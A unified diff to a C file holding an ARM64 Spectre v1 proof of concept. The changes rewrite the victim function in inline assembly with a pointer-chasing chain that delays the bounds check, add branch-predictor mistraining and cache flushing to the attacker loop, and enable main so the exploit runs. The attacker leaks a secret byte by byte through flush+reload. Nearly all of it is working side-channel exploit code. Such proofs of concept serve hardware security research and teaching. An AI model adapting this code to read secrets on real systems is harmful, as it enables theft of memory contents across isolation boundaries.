@@ -235,16 +235,44 @@ void decode_flush_reload_state(char *c, const uint64_t *hits, size_t cnt) {
 // ====== End of helper functions ======
 
 // ====== Below is a common Spectre "PoC" ======
-uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
-volatile int32_t array_size = 8;
+const uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
+volatile size_t array_size = 8;
 
-int naive_victim(uint8_t *pages, int32_t idx, size_t stride) {
-    printf("%i\n", idx);
-    if (idx < array_size) {
-        volatile uint8_t temp = *(pages+(*(array+idx) * stride));
-    }
+int naive_victim(uint8_t *pages, size_t idx, size_t stride) {
+    uint8_t temp;
+    __asm__ volatile(
+        "mov   x8, %[index]                        \n\t"  // Move idx into x8
+
+        "and   x9, x8, #0xFF                       \n\t"  // Mask to valid range
+        "lsl   x9, x9, #6                          \n\t"  // Shift x9 by 6
+        "ldrb  w9, [%[pages_addr], x9]             \n\t"  // Load from pages[x9]
+        "and   x9, x9, #0xFF                       \n\t"  // Mask result
+        "lsl   x9, x9, #6                          \n\t"  // Shift x9 by 6
+        "ldrb  w9, [%[pages_addr], x9]             \n\t"  // Chase again
+        "and   x9, x9, #0xFF                       \n\t"  // Mask result
+        "lsl   x9, x9, #6                          \n\t"  // Shift x9 by 6
+        "ldrb  w9, [%[pages_addr], x9]             \n\t"  // Chase again
+        "and   x9, x9, #0xFF                       \n\t"  // Mask result
+        "lsl   x9, x9, #6                          \n\t"  // Shift x9 by 6
+        "ldrb  w9, [%[pages_addr], x9]             \n\t"  // Chase again
+        "eor   x8, x8, x9                          \n\t"  // Combine with original idx
+
+        "cmp   x8, #8                              \n\t"  // Compare idx with array_size
+        "b.ge  1f                                  \n\t"  // Branch if idx >= array_size (skip)
+        "ldrb  w8, [%[array_addr], x8]             \n\t"  // Load array[idx]
+        "lsl   x8, x8, #14                         \n\t"  // Shift left by 14
+        "ldrb  w8, [%[pages_addr], x8]             \n\t"  // Load pages[array[idx] << 14]
+        "1:                                        \n\t"  // Skip label
+        : [temp] "=m" (temp)
+        : [pages_addr] "r" (pages),
+          [array_addr] "r" (array),
+          [index] "r" (idx)
+        : "x8", "x9", "memory", "cc"
+    );
     return 0;
 }
+
+
 
 
 void naive_attacker() {
@@ -268,23 +296,23 @@ void naive_attacker() {
 
     const bool mmap_or_const = true;
     const char *use_this = mmap_or_const ? secret1 : big_secret;
-    int32_t malicious_index = (int64_t)use_this - (int64_t)array;
+    size_t malicious_index = (uintptr_t)use_this - (uintptr_t)array;
     printf("Secret address: %p, Array address: %p\n", use_this, array);
     printf("The malicious index is %p-%p=%#x\n", use_this, array,
            malicious_index);
     printf("-----------------------------------------\n");
     
     //uint32_t set_size = find_eviction_set()
-
+    int mistrain = 32;
     for (size_t c = 0; c < strlen(use_this); c++) {
         for (size_t r = 0; r < 200; r++) {
-            for (size_t t = 0; t < 16; t++) {
-                bool is_attack = (t % 8 == 8 - 1);
-                int32_t index = cselect(malicious_index + c, 0, is_attack);
+            for (size_t t = 0; t < mistrain; t++) {
+                bool is_attack = (t % mistrain == mistrain - 1);
+                size_t index = cselect(malicious_index + c, 0, is_attack);
                 
-                //evict(set_size);
+                flush_whole_cache();
+                touch(secret);
                 fence();
-
                 
                 naive_victim(pages, index, stride);
             }
@@ -306,7 +334,7 @@ void naive_attacker() {
     return;
 }
 
-int main1(int argc, char **argv) {
+int main(int argc, char **argv) {
     flush_buffer = (uint8_t*)malloc(256 * PAGE_SIZE);
 
     // Choose which cache line within the page to place the secret on.
